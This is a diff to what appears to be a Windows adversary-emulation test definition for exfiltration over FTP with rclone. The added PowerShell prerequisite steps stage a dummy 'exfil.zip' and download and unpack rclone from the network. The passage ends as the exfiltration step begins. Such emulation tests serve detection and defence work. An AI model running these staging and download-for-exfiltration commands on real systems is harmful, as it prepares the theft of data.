@@ -28,6 +28,18 @@ requirements:
     platforms:
         - os: windows
 steps:
+    - name: |
+        Check if the exfil package exists
+      inline: |
+        if (Test-Path C:\Users\Public\Downloads\exfil.zip) {exit 0} else {{fsutil file createnew C:\Users\Public\Downloads\exfil.zip 20485760
+        }}
+      executor: powershell
+    - name: Check if rclone zip exists
+      inline: |
+        if (Test-Path C:\Users\Public\Downloads\rclone-current-windows-amd64.zip) {exit 0} else {{Invoke-WebRequest -Uri "https://downloads.rclone.org/rclone-current-windows-amd64.zip" -OutFile "C:\Users\Public\Downloads\rclone-current-windows-amd64.zip"
+        Expand-Archive C:\Users\Public\Downloads\rclone-current-windows-amd64.zip -DestinationPath C:\Users\Public\Downloads\
+        }}
+      executor: powershell
     - name: exfiltration-over-alternative-protocol---ftp---rclone
       inline: |-
         $rclone_bin = Get-ChildItem C:\Users\Public\Downloads\ -Recurse -Include "rclone.exe" | Select-Object -ExpandProperty FullName
